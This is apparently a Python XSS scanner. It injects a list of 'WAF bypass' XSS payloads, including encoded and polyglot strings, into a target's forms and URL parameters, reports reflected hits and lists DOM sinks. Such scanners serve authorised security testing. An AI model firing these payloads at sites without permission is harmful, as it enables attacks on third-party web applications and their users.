"""
APEX XSS Scanner
Advanced XSS detection with WAF bypass payloads
"""
import requests
from urllib.parse import urljoin, urlparse, parse_qs, urlencode
from bs4 import BeautifulSoup
import re

# WAF bypass payloads
XSS_PAYLOADS = [
    # Basic
    '<script>alert(1)</script>',
    '"><script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    # Event handlers
    '<body onload=alert(1)>',
    '<svg onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    # WAF bypass
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert(1)</script>',
    '%3Cscript%3Ealert(1)%3C/script%3E',
    '<script x>alert(1)</script>',
    '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
    # Polyglots
    'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>\\x3e',
    # DOM-based
    '#"><img src=x onerror=alert(1)>',
    'javascript:alert(1)',
    # Null byte injection
    '<script>alert(1)</script>%00',
    # Double encoding
    '%253Cscript%253Ealert(1)%253C%252Fscript%253E',
]

def scan_xss(target_url, timeout=5):
    """Scan for XSS vulnerabilities"""
    vulns = []
    
    if not target_url.startswith('http'):
        target_url = f'https://{target_url}'
    
    try:
        # Get the page
        r = requests.get(target_url, timeout=timeout, verify=False, 
                        headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'})
        content = r.text
        soup = BeautifulSoup(content, 'html.parser')
        
        # Test forms
        forms = soup.find_all('form')
        for form in forms[:5]:
            action = form.get('action', '')
            method = form.get('method', 'get').lower()
            form_url = urljoin(target_url, action) if action else target_url
            
            inputs = form.find_all(['input', 'textarea'])
            for input_field in inputs[:5]:
                name = input_field.get('name', '')
                if not name:
                    continue
                
                for payload in XSS_PAYLOADS[:8]:
                    try:
                        data = {name: payload}
                        if method == 'post':
                            resp = requests.post(form_url, data=data, timeout=timeout, verify=False,
                                               headers={'User-Agent': 'Mozilla/5.0'})
                        else:
                            resp = requests.get(form_url, params=data, timeout=timeout, verify=False,
                                              headers={'User-Agent': 'Mozilla/5.0'})
                        
                        if payload in resp.text:
                            vulns.append({
                                'type': 'xss',
                                'subtype': 'reflected',
                                'endpoint': form_url,
                                'parameter': name,
                                'payload': payload,
                                'result': 'Payload reflected in response',
                                'confirmed': True,
                                'severity': 'high',
                                'description': f'Reflected XSS via form parameter "{name}". Can inject malicious scripts that execute in victims\' browsers.'
                            })
                            break
                    except:
                        pass
        
        # Test URL parameters
        parsed = urlparse(target_url)
        if parsed.query:
            params = parse_qs(parsed.query)
            for param in list(params.keys())[:5]:
                for payload in XSS_PAYLOADS[:8]:
                    try:
                        test_params = params.copy()
                        test_params[param] = [payload]
                        test_url = parsed._replace(query=urlencode(test_params, doseq=True)).geturl()
                        resp = requests.get(test_url, timeout=timeout, verify=False,
                                          headers={'User-Agent': 'Mozilla/5.0'})
                        if payload in resp.text:
                            vulns.append({
                                'type': 'xss',
                                'subtype': 'reflected',
                                'endpoint': target_url,
                                'parameter': param,
                                'payload': payload,
                                'result': 'Payload reflected in response',
                                'confirmed': True,
                                'severity': 'high',
                                'description': f'Reflected XSS via URL parameter "{param}". Crafted URLs can execute scripts in victims\' browsers.'
                            })
                            break
                    except:
                        pass
        
        # Check for DOM-based XSS sinks
        dom_sinks = ['document.write', 'innerHTML', 'eval(', 'location.href', 'location.hash']
        for sink in dom_sinks:
            if sink in content:
                vulns.append({
                    'type': 'xss',
                    'subtype': 'dom',
                    'endpoint': target_url,
                    'parameter': 'N/A',
                    'payload': f'DOM sink: {sink}',
                    'result': f'Potential DOM XSS sink found: {sink}',
                    'confirmed': False,
                    'severity': 'medium',
                    'description': f'Potential DOM-based XSS. JavaScript uses {sink} which may process user input unsafely.'
                })
        
    except Exception as e:
        pass
    
    return vulns